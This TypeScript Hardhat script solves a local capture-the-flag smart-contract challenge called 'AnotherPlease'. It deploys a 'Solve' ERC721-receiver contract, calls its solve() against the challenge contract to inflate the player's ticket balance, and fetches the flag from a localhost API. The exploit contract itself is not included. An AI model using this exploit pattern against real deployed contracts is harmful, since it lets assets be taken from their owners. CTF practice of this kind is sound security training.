import { ethers } from "hardhat";

const API_URL = "http://localhost:3000";

async function getChallengeDetails(): Promise<ChallengeDetails> {
  const data = await fetch(`${API_URL}/challenge`);
  return (await data.json()) as ChallengeDetails;
}

async function getFlag(): Promise<{ flag: string }> {
  const data = await fetch(`${API_URL}/challenge/solve`);

  return (await data.json()) as { flag: string };
}

async function main() {
  const details = await getChallengeDetails();

  const player_wallet = new ethers.Wallet(
    details.player_wallet.private_key,
    ethers.provider
  );

  // Attach to challenge contract
  const challenge_contract = await ethers.getContractAt(
    "AnotherPlease",
    details.contract_address,
    player_wallet
  );

  console.log("Before exploit");
  console.log(
    `Tickets owned by player wallet: ${await challenge_contract.balanceOf(
      player_wallet.address
    )}`
  );

  // Get our ERC721 Receiver deployed
  const solveFactory = await ethers.getContractFactory("Solve", player_wallet);
  const solveContract = await (await solveFactory.deploy()).waitForDeployment();

  // Run exploit on contract and make sure gas limit is large enough
  await (
    await solveContract.solve(await challenge_contract.getAddress(), {
      gasLimit: 1e7,
    })
  ).wait();

  console.log("After exploit");
  console.log(
    `Tickets owned by player wallet: ${await challenge_contract.balanceOf(
      player_wallet.address
    )}`
  );

  console.log(await getFlag());
}

type ChallengeDetails = {
  name: string;
  description: string;
  status: string;
  player_wallet: {
    address: string;
    private_key: string;
    balance: string;
  };
  contract_address: string;
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
